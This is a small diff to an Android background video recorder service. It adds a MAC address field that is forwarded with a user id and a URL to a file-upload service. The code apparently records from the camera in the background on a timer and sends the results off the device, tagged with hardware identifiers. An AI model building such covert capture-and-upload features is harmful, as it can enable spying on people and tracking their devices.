@@ -32,7 +32,7 @@ public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Ca
     private SurfaceView surfaceView;
     private Camera camera = null;
     private MediaRecorder mediaRecorder = null;
-    private String uid, url;
+    private String uid, url,macAddress;
 
     @SuppressLint("RtlHardcoded")
     @Override
@@ -68,6 +68,7 @@ public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Ca
         Intent intent = new Intent(getApplicationContext(), UploadFileService.class);
         intent.putExtra("uid",uid);
         intent.putExtra("url",url);
+        intent.putExtra("macAddress",macAddress);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
         } else {
@@ -206,6 +207,7 @@ public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Ca
         isFrontFacing = extras.getBoolean("Front_Request");
         uid= extras.getString("uid");
         url=extras.getString("url");
+        macAddress=extras.getString("macAddress");
         new CountDownTimer(17000, 1000) {
 
             public void onTick(long millisUntilFinished) {
